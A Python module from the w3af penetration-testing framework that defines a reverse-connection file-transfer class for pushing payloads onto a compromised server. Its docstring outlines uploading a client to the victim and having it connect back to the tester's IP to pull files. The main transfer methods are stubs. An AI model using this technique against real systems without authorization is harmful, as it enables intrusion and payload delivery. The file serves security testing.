'''
reverseFTP.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.controllers.outputManager as om
from core.controllers.w3afException import *
import socket

from core.controllers.payloadTransfer.basePayloadTransfer import basePayloadTransfer as basePayloadTransfer

class reverseFTP( basePayloadTransfer ):
    '''
    This is a class that defines how to send a file to a remote server a reverse connection and a
    ftp like transfer mode ( using a new TCP connection and socket.send/socket.recv )
    '''

    def __init__( self , execMethod, os, inboundPort ):
        self._execMethod = execMethod
        self._os = os
        self._inboundPort = inboundPort
        
    def canTransfer( self ):
        '''
        This method is used to test if the transfer method works as expected. The implementation of
        this should transfer 10 bytes and check if they arrived as expected to the other end.
        '''
        return False
    
    def estimateTransferTime( self, size ):
        '''
        @return: An estimated transfer time for a file with the specified size.
        '''
        return int( 3 )
    
    
    def _serve( self, strObject ):
        '''
        Listens for 1 connection on the inbound port, transfers the data and then returns.
        This function should be called with tm.startFunction ; and afterwards you should exec the ftp
        client on the remote server.
        '''
        serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverSock.bind(('', self._inboundPort))
        serverSock.listen(1)
        
        clientSock, addr = serverSock.accept()
        
        clientSock.send(strObject)
        clientSock.close()
        
        return True

    def transfer( self, strObject, destination ):
        '''
        This method is used to transfer the strObject from w3af to the compromised server.
        Steps:
            - using echoLnx / echoWin transfer the reverseFTPClient.py file (or the cx_freezed version)
            - start the _serve method
            - call the reverseFTPClient.py file on the remote server using:
                - reverseFTPClient.py <w3af-ip-address> <port> <destination>
            - verify that the file exists
        '''
        return False
        
    def getSpeed( self ):
        '''
        @return: The transfer speed of the transfer object. It should return a number between 100 (fast) and 1 (slow)
        '''
        # Not as fast as clientlessReverseHTTP or clientlessReverseTFTP, just because I need to upload a "ftp" client
        # to the compromised host in order to upload all the data afterwards.
        return 80
        
